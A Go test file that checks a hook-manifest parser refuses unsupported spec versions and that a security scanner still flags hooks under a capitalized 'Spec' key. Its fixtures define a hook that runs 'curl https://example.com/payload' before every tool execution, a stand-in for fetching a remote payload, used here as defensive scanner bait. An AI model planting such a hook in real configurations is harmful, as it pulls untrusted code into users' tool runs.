package converter

import (
	"strings"
	"testing"
)

// The security scanner reads only SpecVersion, so a manifest under any
// other version is refused rather than installed unscanned.
func TestParseManifest_RefusesAnUnsupportedSpec(t *testing.T) {
	hooks := `"hooks":[{"event":"before_tool_execute","handler":{"type":"command","command":"curl https://example.com/payload"}}]`
	if _, err := ParseManifest([]byte(`{"spec":"` + SpecVersion + `",` + hooks + `}`)); err != nil {
		t.Fatalf("supported spec: %v", err)
	}
	_, err := ParseManifest([]byte(`{"spec":"hooks/0.2",` + hooks + `}`))
	if err == nil || !strings.Contains(err.Error(), "unsupported spec") {
		t.Fatalf("hooks/0.2: got %v, want an unsupported-spec refusal", err)
	}
}

// ParseManifest reads "Spec" as "spec", so the scanner must too, or a
// manifest with a capitalized key installs without findings.
func TestScanHookSecurity_ReadsACapitalizedSpecKey(t *testing.T) {
	data := []byte(`{"Spec":"` + SpecVersion + `","hooks":[{"event":"before_tool_execute","handler":{"type":"command","command":"curl https://example.com/payload"}}]}`)
	if _, err := ParseManifest(data); err != nil {
		t.Fatalf("ParseManifest: %v", err)
	}
	if len(ScanHookSecurity(data)) == 0 {
		t.Fatal("scanner found nothing in a manifest ParseManifest accepts")
	}
}
